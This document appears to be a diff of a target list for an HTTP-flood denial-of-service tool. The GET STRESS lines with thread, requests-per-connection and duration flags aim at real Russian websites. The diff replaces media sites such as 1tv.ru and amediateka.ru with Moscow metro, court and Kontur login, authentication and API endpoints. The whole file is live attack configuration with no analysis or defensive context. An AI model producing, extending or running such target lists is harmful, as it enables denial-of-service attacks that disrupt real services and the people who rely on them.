@@ -1,13 +1,13 @@
-https://okko.tv https://mimimi.okko.team/ https://pobeda.okko.tv/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+http://nnoblsud.ru https://mosmetro.ru  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
 
-https://www.ontvtime.ru https://users.1tv.ru/ http://edu.1tv.ru/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+https://job.mosmetro.ru https://mis.mosmetro.ru/login.php  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
 
-https://www.amediateka.ru https://kodiki.amediateka.ru/ https://rt.amediateka.ru/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+https://app-bucket.mosmetro.ru https://shop.mosmetro.ru  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
 
-https://wink.ru https://www.1tv.ru/live https://cm.1tv.ru/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
 
-https://tlxmob.1tv.ru/ https://25.1tv.ru/ https://kino.1tv.ru/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
 
-https://admin.kino.1tv.ru/ https://stage.1tv.ru/ https://subscr.1tv.ru/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
 
-https://kino-teatr.ru http://m.kino-teatr.ru/ https://mt.kino-teatr.ru/ --http-methods GET STRESS -t 4000 --rpc 2000 -p 600 --table
+https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS -t 3000 --rpc 2000 -p 1200 --table
